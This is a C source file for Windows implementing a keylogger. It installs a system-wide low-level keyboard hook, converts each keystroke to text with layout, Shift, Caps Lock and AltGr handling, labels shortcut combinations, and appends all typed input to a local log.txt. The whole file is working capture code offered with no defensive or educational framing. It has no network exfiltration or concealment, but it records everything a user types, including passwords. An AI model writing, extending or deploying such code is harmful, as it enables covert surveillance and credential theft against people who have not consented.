#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>

#define LLKHF_REPEATED 0x00000001

typedef struct {
    bool ctrl;
    bool shift;
    bool alt;
    bool win;
    DWORD vkCode;
} KeyCombo;

// Global variables to track last modifier state
static bool wasModifierPressed = false;

#define LLKHF_REPEATED 0x00000001

// Functions to log keystrokes
void logKeystroke(char *key){
    FILE *file = fopen("log.txt", "a+");
    if(file){
        fprintf(file,"%s", key);
        fclose(file);
    }
}

// Global variables to track modifier states
static bool isModifierKey(DWORD vkCode) {
    return (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT || vkCode == VK_SHIFT ||
            vkCode == VK_LCONTROL || vkCode == VK_RCONTROL || vkCode == VK_CONTROL ||
            vkCode == VK_LMENU || vkCode == VK_RMENU || vkCode == VK_MENU ||
            vkCode == VK_LWIN || vkCode == VK_RWIN);
}

bool checkOtherKeysPressed() {
    // List of virtual key codes we want to check
    const DWORD keysToCheck[] = {
        // Letters
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
        'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
        // Numbers
        '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
        // Function keys
        VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6,
        VK_F7, VK_F8, VK_F9, VK_F10, VK_F11, VK_F12,
        // Other common keys
        VK_ESCAPE, VK_TAB, VK_RETURN, VK_SPACE, VK_BACK,
        VK_DELETE, VK_INSERT, VK_HOME, VK_END,
        VK_PRIOR, VK_NEXT, VK_LEFT, VK_RIGHT, VK_UP, VK_DOWN
    };
    
    const int numKeys = sizeof(keysToCheck) / sizeof(keysToCheck[0]);
    
    for(int i = 0; i < numKeys; i++) {
        if(GetAsyncKeyState(keysToCheck[i]) & 0x8000) {
            return true;
        }
    }
    
    return false;
}

// Function to create string representation of key combination
void getKeyComboString(const KeyCombo* combo, char* output) {
    strcpy(output, "[");
    
    if(combo->win) strcat(output, "WIN+");
    if(combo->ctrl) strcat(output, "CTRL+");
    if(combo->shift) strcat(output, "SHIFT+");
    if(combo->alt) strcat(output, "ALT+");
    
    switch(combo->vkCode) {
        case 'A': case 'B': case 'C': case 'D': case 'E': case 'F':
        case 'G': case 'H': case 'I': case 'J': case 'K': case 'L':
        case 'M': case 'N': case 'O': case 'P': case 'Q': case 'R':
        case 'S': case 'T': case 'U': case 'V': case 'W': case 'X':
        case 'Y': case 'Z': {
            char letter[2] = {(char)combo->vkCode, '\0'};
            strcat(output, letter);
            break;
        }
        case VK_ESCAPE: strcat(output, "ESC"); break;
        case VK_TAB: strcat(output, "TAB"); break;
        case VK_RETURN: strcat(output, "ENTER"); break;
        case VK_SPACE: strcat(output, "SPACE"); break;
        case VK_BACK: strcat(output, "BACK"); break;
        case VK_DELETE: strcat(output, "DEL"); break;
        case VK_INSERT: strcat(output, "INS"); break;
        case VK_HOME: strcat(output, "HOME"); break;
        case VK_END: strcat(output, "END"); break;
        case VK_PRIOR: strcat(output, "PGUP"); break;
        case VK_NEXT: strcat(output, "PGDN"); break;
        case VK_F1: strcat(output, "F1"); break;
        case VK_F2: strcat(output, "F2"); break;
        case VK_F3: strcat(output, "F3"); break;
        case VK_F4: strcat(output, "F4"); break;
        case VK_F5: strcat(output, "F5"); break;
        case VK_F6: strcat(output, "F6"); break;
        case VK_F7: strcat(output, "F7"); break;
        case VK_F8: strcat(output, "F8"); break;
        case VK_F9: strcat(output, "F9"); break;
        case VK_F10: strcat(output, "F10"); break;
        case VK_F11: strcat(output, "F11"); break;
        case VK_F12: strcat(output, "F12"); break;
        case '0': case '1': case '2': case '3': case '4':
        case '5': case '6': case '7': case '8': case '9': {
            char digit[2] = {(char)combo->vkCode, '\0'};
            strcat(output, digit);
            break;
        }
        default: {
            char unknown[16];
            sprintf(unknown, "KEY(%d)", combo->vkCode);
            strcat(output, unknown);
        }
    }
    strcat(output, "]");
}

// Function to get the character from the virtual key code
void getCharFromKey(char *keyName, WPARAM wParam, LPARAM lParam){
    KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT *)lParam;
    DWORD vkCode = kbStruct->vkCode;

    // Get keyboard layout for current thread
    HKL keyboardLayout = GetKeyboardLayout(0);

    // If it's a standalone modifier key press
    if (isModifierKey(vkCode)) {
        switch(vkCode) {
            case VK_LSHIFT:
            case VK_RSHIFT:
            case VK_SHIFT:    
                strcpy(keyName,"[SHIFT]"); 
                return;
            case VK_LCONTROL:
            case VK_RCONTROL:
            case VK_CONTROL:    
                strcpy(keyName,"[CTRL]"); 
                return;
            case VK_LMENU:
            case VK_MENU:    
                strcpy(keyName,"[ALT]"); 
                return;
            case VK_RMENU:
                strcpy(keyName,"[Alt Gr]");
                return;
        }
    }

    // Handle special keys
    switch(vkCode) {
        case VK_RETURN: strcpy(keyName,"[ENTER]\n"); break;
        case VK_SPACE:  strcpy(keyName," "); break;
        case VK_BACK:   strcpy(keyName,"[BACK]"); break;
        case VK_TAB:    strcpy(keyName,"[TAB]"); break;
        case VK_ESCAPE: strcpy(keyName,"[ESC]"); break;
        case VK_END:    strcpy(keyName,"[END]"); break;
        case VK_HOME:   strcpy(keyName,"[HOME]"); break;
        case VK_LEFT:   strcpy(keyName,"[LEFT]"); break;
        case VK_UP:     strcpy(keyName,"[UP]"); break;
        case VK_RIGHT:  strcpy(keyName,"[RIGHT]"); break;
        case VK_DOWN:   strcpy(keyName,"[DOWN]"); break;
        case VK_DELETE: strcpy(keyName, "[DEL]"); break;
        case VK_INSERT: strcpy(keyName, "[INS]"); break;
        case VK_PRIOR: strcpy(keyName, "[PGUP]"); break;
        case VK_NEXT: strcpy(keyName, "[PGDN]"); break;
        case VK_CAPITAL: strcpy(keyName, "[CAPS]"); break;
        case VK_F1: strcpy(keyName, "[F1]"); break;
        case VK_F2: strcpy(keyName, "[F2]"); break;
        case VK_F3: strcpy(keyName, "[F3]"); break;
        case VK_F4: strcpy(keyName, "[F4]"); break;
        case VK_F5: strcpy(keyName, "[F5]"); break;
        case VK_F6: strcpy(keyName, "[F6]"); break;
        case VK_F7: strcpy(keyName, "[F7]"); break;
        case VK_F8: strcpy(keyName, "[F8]"); break;
        case VK_F9: strcpy(keyName, "[F9]"); break;
        case VK_F10: strcpy(keyName, "[F10]"); break;
        case VK_F11: strcpy(keyName, "[F11]"); break;
        case VK_F12: strcpy(keyName, "[F12]"); break;
        default: {
            // Get keyboard state
            BYTE keyboardState[256] = {0};

            // Check if SHIFT is pressed
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                keyboardState[VK_SHIFT] = 0x80;  // This will make ToUnicode give us uppercase
            }
            
            // Check CAPS LOCK
            if (GetKeyState(VK_CAPITAL) & 0x0001) {
                keyboardState[VK_CAPITAL] = 0x01;
            }

            // Check if Alt Gr is pressed (Alt + Ctrl)
            if (((GetAsyncKeyState(VK_MENU) & 0x8000) && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) || (GetAsyncKeyState(VK_RMENU) & 0x8000)) {
                keyboardState[VK_MENU] = 0x80;  // Set Alt state
                keyboardState[VK_CONTROL] = 0x80;  // Set Ctrl state
            }
            
            // Convert virtual key to character
            WCHAR unicodeChar[16];
            int result = ToUnicodeEx(vkCode, kbStruct->scanCode, keyboardState, unicodeChar, 16, 0, keyboardLayout);
            
            if (result > 0) {
                // Convert to UTF-8 with proper buffer size
                int utf8Size = WideCharToMultiByte(CP_UTF8, 0, unicodeChar, result, keyName, 32, NULL, NULL);
                if (utf8Size > 0) {
                    keyName[utf8Size] = '\0';
                } else {
                    strcpy(keyName, "[CONVERT_ERROR]");
                }
            } else if (result == -1) {
                // Dead key state, wait for next character
                strcpy(keyName, "");
            } else {
                strcpy(keyName, "[UNKNOWN]");
            }
        } 
    }

}

// Hook procedure to capture keystroke
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
    if(nCode >= 0) {
        KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT *)lParam;
        static bool wasModifierPressed = false;
        static DWORD modifierVkCode = 0;
        static DWORD lastKeyTime = 0;
        static bool isWinKeyDown = false;
        DWORD currentTime = GetTickCount();
        
        // Improved AltGr detection
        bool isAltGr = (GetAsyncKeyState(VK_RMENU) & 0x8000) != 0;
        
        if(wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            bool isModifier = isModifierKey(kbStruct->vkCode);
            
            // Track Windows key state
            if(kbStruct->vkCode == VK_LWIN || kbStruct->vkCode == VK_RWIN) {
                isWinKeyDown = true;
            }
            
            if(!isModifier) {
                bool ctrl = !isAltGr && (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
                bool alt = (GetAsyncKeyState(VK_LMENU) & 0x8000) != 0;
                bool win = isWinKeyDown;
                
                if(!isAltGr && (ctrl || alt || win)) {
                    KeyCombo combo = {
                        .ctrl = ctrl,
                        .shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0,
                        .alt = alt,
                        .win = win,
                        .vkCode = kbStruct->vkCode
                    };
                    
                    char shortcutStr[64];
                    getKeyComboString(&combo, shortcutStr);
                    logKeystroke(shortcutStr);
                }
                else {
                    char key[32];
                    getCharFromKey(key, wParam, lParam);
                    logKeystroke(key);
                }
                wasModifierPressed = false;
                modifierVkCode = 0;
            }
            else {
                // Store modifier press state
                if(!(GetAsyncKeyState(VK_CONTROL) & 0x8000 && !isAltGr) && 
                   !(GetAsyncKeyState(VK_LMENU) & 0x8000) && 
                   !(GetAsyncKeyState(VK_SHIFT) & 0x8000) &&
                   !isWinKeyDown) {
                    wasModifierPressed = true;
                    modifierVkCode = kbStruct->vkCode;
                    lastKeyTime = currentTime;
                }
            }
        }
        else if(wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
            // Update Windows key state
            if(kbStruct->vkCode == VK_LWIN || kbStruct->vkCode == VK_RWIN) {
                isWinKeyDown = false;
            }
            
            if(wasModifierPressed && kbStruct->vkCode == modifierVkCode) {
                // Check if no other keys were pressed during this time
                if(!checkOtherKeysPressed() && (currentTime - lastKeyTime < 500)) {
                    if(kbStruct->vkCode == VK_RMENU) {
                        logKeystroke("[ALT GR]");
                    }
                    else if(kbStruct->vkCode == VK_LWIN || kbStruct->vkCode == VK_RWIN) {
                        logKeystroke("[WIN]");
                    }
                    else if((kbStruct->vkCode == VK_LCONTROL || kbStruct->vkCode == VK_RCONTROL) && !isAltGr) {
                        logKeystroke("[CTRL]");
                    }
                    else if(kbStruct->vkCode == VK_LMENU) {
                        logKeystroke("[ALT]");
                    }
                    else if(kbStruct->vkCode == VK_LSHIFT || kbStruct->vkCode == VK_RSHIFT) {
                        logKeystroke("[SHIFT]");
                    }
                }
            }
            wasModifierPressed = false;
            modifierVkCode = 0;
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(){
    // Set a low-level system hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if(hook == NULL){
        printf("Failed to set hook\n");
        return 1;
    }

    // Message loop to keep the hook active
    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook and exit
    UnhookWindowsHookEx(hook);
    return 0;
}